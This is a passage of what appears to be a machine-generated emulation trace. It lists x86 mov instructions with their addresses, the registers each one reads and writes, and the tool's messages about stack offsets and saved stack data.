ESP 0x0 and offset 0x7f5c for stack size 0x10000 saving data to stack: 0 4 0x42dd87: mov ecx, dword ptr [ebp - 0xe4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 0x42dd8f: mov edx, dword ptr [ebp - 0xf4], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 0x42dd95: mov dword ptr [ebp - 0xe4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42dda1: mov dword ptr [ebp - 0xf4], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42dda7: mov edx, ebx, regs_read: [21], regs_write: [24] 0x42ddb9: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42ddbb: mov esi, edx, regs_read: [24], regs_write: [29] 0x42ddc9: mov dword ptr [ebp - 0x140], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 4 0x42dddd: mov ebx, dword ptr [ebp - 0xa4], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 0x42dde3: mov dword ptr [ebp - 0x128], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 0 4 0x42dde9: mov esi, ebx, regs_read: [21], regs_write: [29] 0x42ddf7: mov dword ptr [ebp - 0xa4], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 saving data to stack: 0 4 0x42ddff: mov dword ptr [ebp - 0x118], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42de0b: mov dword ptr [ebp - 0x110], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x42de17: mov dword ptr [ebp - 0xec], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42de27: mov ebx, dword ptr [ebp - 0x13c], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7ec4 for stack size 0x10000 0x42de2d: mov eax, edx, regs_read: [24], regs_write: [19] 0x42de2f: mov dword ptr [ebp - 0x108], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42de39: mov esi, dword ptr [ebp - 0x11c], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 0x42de46: mov ecx, dword ptr [ebp - 0xe0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 0x42de4c: mov dword ptr [ebp - 0xa4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 saving data to stack: 0 4 0x42de56: mov edx, dword ptr [ebp - 0xb4], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 0x42de5c: mov dword ptr [ebp - 0x94], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42de62: mov eax, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42de6f: mov dword ptr [ebp - 0xa0], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42de78: mov dword ptr [ebp - 0xe0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42de84: mov ecx, dword ptr [ebp - 0x10c], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 0x42de8c: mov dword ptr [ebp - 0xb4], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 saving data to stack: 0 4 0x42de96: mov ecx, dword ptr [ebp - 0xf0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 0x42de9e: mov edx, dword ptr [ebp - 0xfc], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 0x42dea4: mov dword ptr [ebp - 0xf0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42deb0: mov dword ptr [ebp - 0xfc], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f04 for stack size 0x10000 saving data to stack: 0 4 0x42deb6: mov edx, esi, regs_read: [29], regs_write: [24] 0x42dec8: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42decd: mov esi, edx, regs_read: [24], regs_write: [29] 0x42ded8: mov dword ptr [ebp - 0x134], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ecc for stack size 0x10000 saving data to stack: 0 4 0x42deec: mov ebx, dword ptr [ebp - 0xb4], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 0x42def2: mov dword ptr [ebp - 0x100], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 4 0x42def8: mov esi, ebx, regs_read: [21], regs_write: [29] 0x42df01: mov dword ptr [ebp - 0x8c], 0, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x42df10: mov dword ptr [ebp - 0xb4], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 saving data to stack: 0 4 0x42df18: mov dword ptr [ebp - 0x9c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42df24: mov dword ptr [ebp - 0x124], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7edc for stack size 0x10000 saving data to stack: 0 4 0x42df30: mov dword ptr [ebp - 0x120], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 4 0x42df40: mov dword ptr [ebp - 0x10c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42df46: mov esi, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42df4e: mov ebx, edx, regs_read: [24], regs_write: [21] 0x42df5d: mov edx, eax, regs_read: [19], regs_write: [24] 0x42df5f: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42df77: mov dword ptr [ebp - 0x114], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42df7f: mov dword ptr [ebp - 0xe8], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42df91: mov dword ptr [ebp - 0x114], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42dfa1: mov dword ptr [ebp - 0x88], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x42dfc1: mov eax, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42dfca: mov ebx, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 0x42dfd5: mov ecx, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42dfdb: mov dword ptr [ebp - 0xf8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f08 for stack size 0x10000 saving data to stack: 0 4 0x42dfe9: mov dword ptr [ebp - 0xec], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42dfef: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42dff1: mov eax, dword ptr [ebp - 0x114], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 0x42e00d: mov dword ptr [ebp - 0x13c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec4 for stack size 0x10000 saving data to stack: 0 4 0x42e013: mov eax, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 0x42e01b: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e01d: mov dword ptr [ebp - 0xac], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42e023: mov ebx, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42e02d: mov dword ptr [ebp - 0xb8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f48 for stack size 0x10000 saving data to stack: 0 4 0x42e035: mov dword ptr [ebp - 0xbc], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f44 for stack size 0x10000 saving data to stack: 0 4 0x42e03b: mov ecx, eax, regs_read: [19], regs_write: [22] 0x42e048: mov ebx, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42e04e: mov esi, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42e054: mov edx, dword ptr [ebp - 0x110], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 0x42e05a: mov dword ptr [ebp - 0xcc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f34 for stack size 0x10000 saving data to stack: 0 4 0x42e064: mov dword ptr [ebp - 0xa0], 0, regs_read: [20], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 saving data to stack: 0 4 0x42e06e: mov eax, dword ptr [ebp - 0xdc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 0x42e077: mov dword ptr [ebp - 0xd8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f28 for stack size 0x10000 saving data to stack: 0 4 0x42e07d: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e096: mov dword ptr [ebp - 0x118], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42e09c: mov edx, esi, regs_read: [29], regs_write: [24] 0x42e09e: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e0b4: mov dword ptr [ebp - 0x98], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42e0ba: mov dword ptr [ebp - 0x114], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42e0c0: mov esi, dword ptr [ebp - 0xdc], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 0x42e0c6: mov ebx, esi, regs_read: [29], regs_write: [21] 0x42e0cb: mov dword ptr [ebp - 0xe8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42e0d1: mov ebx, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42e0de: mov dword ptr [ebp - 0x98], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42e0e8: mov esi, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42e0f4: mov dword ptr [ebp - 0x88], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x42e100: mov eax, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42e106: mov dword ptr [ebp - 0xd4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f2c for stack size 0x10000 saving data to stack: 0 4 0x42e112: mov ecx, dword ptr [ebp - 0x44], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7fbc for stack size 0x10000 0x42e11b: mov ecx, dword ptr [ebp - 0x40], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7fc0 for stack size 0x10000 0x42e12a: mov ecx, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42e136: mov esi, ecx, regs_read: [22], regs_write: [29] 0x42e145: mov ecx, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42e152: mov dword ptr [ebp - 0xb0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f50 for stack size 0x10000 saving data to stack: 0 4 0x42e158: mov dword ptr [ebp - 0x118], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42e168: mov dword ptr [ebp - 0xd0], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42e16e: mov ecx, eax, regs_read: [19], regs_write: [22] 0x42e17b: mov ebx, dword ptr [ebp - 0xc4], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f3c for stack size 0x10000 0x42e181: mov dword ptr [ebp - 0xb4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 saving data to stack: 0 4 0x42e18b: mov eax, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42e194: mov dword ptr [ebp - 0x11c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 saving data to stack: 0 4 0x42e19a: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e1ab: mov edx, dword ptr [ebp - 0x124], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7edc for stack size 0x10000 0x42e1b3: mov esi, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42e1bf: mov edx, esi, regs_read: [29], regs_write: [24] 0x42e1c1: mov dword ptr [ebp - 0x9c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42e1cd: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e1dd: mov dword ptr [ebp - 0x114], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42e1e3: mov dword ptr [ebp - 0xc4], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f3c for stack size 0x10000 saving data to stack: 0 4 0x42e1e9: mov esi, dword ptr [ebp - 0xc4], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f3c for stack size 0x10000 0x42e1ef: mov ebx, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42e203: mov dword ptr [ebp - 0x8c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x42e217: mov esi, dword ptr [ebp - 0xc], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7ff4 for stack size 0x10000 0x42e21a: mov dword ptr [ebp - 0xc4], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f3c for stack size 0x10000 saving data to stack: 0 4 0x42e226: mov esi, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42e235: mov eax, dword ptr [ebp - 0x9c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 0x42e23b: mov dword ptr [ebp - 0xdc], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 saving data to stack: 0 4 0x42e255: mov esi, eax, regs_read: [19], regs_write: [29] 0x42e263: mov eax, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42e26b: mov dword ptr [ebp - 0x140], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 4 0x42e273: mov edx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42e279: mov edi, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42e27f: mov dword ptr [ebp - 0x98], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42e28f: mov dword ptr [ebp - 0x108], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42e295: mov ecx, eax, regs_read: [19], regs_write: [22] 0x42e297: mov dword ptr [ebp - 0x114], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42e29d: mov esi, dword ptr [ebp - 0x144], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7ebc for stack size 0x10000 0x42e2ae: mov dword ptr [ebp - 0x90], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42e2b8: mov eax, dword ptr [ebp - 0xa4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 0x42e2c1: mov dword ptr [ebp - 0x110], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x42e2c7: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42e2e0: mov dword ptr [ebp - 0xa8], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 saving data to stack: 0 4 0x42e2e6: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e2e8: mov edi, ebx, regs_read: [21], regs_write: [23] 0x42e2fe: mov dword ptr [ebp - 0x94], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42e304: mov edx, dword ptr [ebp - 0xa4], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 0x42e30d: mov dword ptr [ebp - 0x8c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x42e313: mov edx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42e324: mov dword ptr [ebp - 0x94], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42e332: mov dword ptr [ebp - 0x100], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 4 0x42e338: mov edx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42e344: mov edx, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x42e34c: mov eax, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42e357: mov ecx, dword ptr [ebp - 0xa8], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f58 for stack size 0x10000 0x42e364: mov dword ptr [ebp - 0x104], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x42e36a: mov eax, ecx, regs_read: [22], regs_write: [19] 0x42e36c: mov dword ptr [ebp - 0x12c], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed4 for stack size 0x10000 saving data to stack: 0 4 0x42e382: mov ecx, edx, regs_read: [24], regs_write: [22] 0x42e386: mov ebx, eax, regs_read: [19], regs_write: [21] 0x42e388: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x42e38e: mov esi, ebx, regs_read: [21], regs_write: [29] 0x42e392: mov dword ptr [ebp - 0x120], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 4 0x42e39a: mov dword ptr [ebp - 0x10c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42e3a0: mov ecx, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42e3a8: mov esi, ecx, regs_read: [22], regs_write: [29] 0x42e3b9: mov dword ptr [ebp - 0xa4], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 saving data to stack: 0 4 0x42e3bf: mov ecx, dword ptr [ebp - 0x11c], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 0x42e3c5: mov dword ptr [ebp - 0xe8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42e3cb: mov eax, dword ptr [ebp - 0xb4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 0x42e3eb: mov edx, ebx, regs_read: [21], regs_write: [24] 0x42e3f3: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e3f5: mov dword ptr [ebp - 0x144], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ebc for stack size 0x10000 saving data to stack: 0 4 0x42e407: mov edx, dword ptr [ebp - 0x11c], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 0x42e40f: mov dword ptr [ebp - 0x114], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42e415: mov esi, dword ptr [ebp - 0xb4], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 0x42e426: mov dword ptr [ebp - 0x94], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42e434: mov dword ptr [ebp - 0xf8], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f08 for stack size 0x10000 saving data to stack: 0 4 0x42e43a: mov esi, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42e445: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f08 for stack size 0x10000 0x42e44b: mov dword ptr [ebp - 0x94], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42e458: mov dword ptr [ebp - 0xec], edx, regs_read: [20, 24], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42e465: mov dword ptr [ebp - 0x108], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef8 for stack size 0x10000 saving data to stack: 0 4 0x42e46b: mov esi, ebx, regs_read: [21], regs_write: [29] 0x42e46d: mov edx, dword ptr [ebp - 0x13c], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7ec4 for stack size 0x10000 0x42e481: mov ebx, dword ptr [ebp - 0x110], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 0x42e489: mov dword ptr [ebp - 0xb4], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f4c for stack size 0x10000 saving data to stack: 0 4 0x42e48f: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e497: mov dword ptr [ebp - 0x9c], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f64 for stack size 0x10000 saving data to stack: 0 4 0x42e4af: mov dword ptr [ebp - 0x128], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed8 for stack size 0x10000 saving data to stack: 0 4 0x42e4b5: mov eax, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42e4c1: mov dword ptr [ebp - 0x124], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7edc for stack size 0x10000 saving data to stack: 0 4 0x42e4d3: mov esi, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42e4e4: mov dword ptr [ebp - 0xac], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 saving data to stack: 0 4 0x42e4ea: mov edx, esi, regs_read: [29], regs_write: [24] 0x42e4ec: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e502: mov dword ptr [ebp - 0x144], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ebc for stack size 0x10000 saving data to stack: 0 4 0x42e508: mov esi, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42e519: mov dword ptr [ebp - 0x88], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x42e52a: mov dword ptr [ebp - 0xd4], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f2c for stack size 0x10000 saving data to stack: 0 4 0x42e530: mov esi, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 0x42e538: mov ebx, dword ptr [ebp - 0xd4], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f2c for stack size 0x10000 0x42e540: mov dword ptr [ebp - 0x88], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x42e546: mov eax, esi, regs_read: [29], regs_write: [19] 0x42e54d: mov ecx, dword ptr [ebp - 0xac], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f54 for stack size 0x10000 0x42e55a: mov dword ptr [ebp - 0x114], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42e560: mov dword ptr [ebp - 0x110], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef0 for stack size 0x10000 saving data to stack: 0 4 0x42e566: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42e578: mov dword ptr [ebp - 0x134], eax, regs_read: [20, 19], regs_write: 